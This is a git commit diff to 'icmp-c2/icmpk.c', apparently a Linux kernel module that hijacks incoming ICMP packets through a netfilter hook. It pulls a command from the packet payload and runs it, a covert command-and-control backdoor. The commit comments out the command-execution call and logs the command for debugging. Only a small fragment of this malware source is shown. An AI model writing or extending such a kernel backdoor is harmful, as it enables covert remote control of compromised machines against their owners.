ae59820bcea71c993209d8e48dc81e4930ef4480
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-11-19 20:44:01 -0500

    back to debug

--- icmp-c2/icmpk.c
+++ icmp-c2/icmpk.c
@@ -286,10 +286,11 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     #endif
 
     char *command = payload+FLAG_LEN;
-    int status = parse_and_run_command(command);
-    #ifdef DEBUG_K
-        pr_info("Status: %d\n", status);
-    #endif
+    pr_info("Command: %s\n", command);
+    // int status = parse_and_run_command(command);
+    // #ifdef DEBUG_K
+    //     pr_info("Status: %d\n", status);
+    // #endif
 
     // TODO: Check if ignore all is set
     if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){
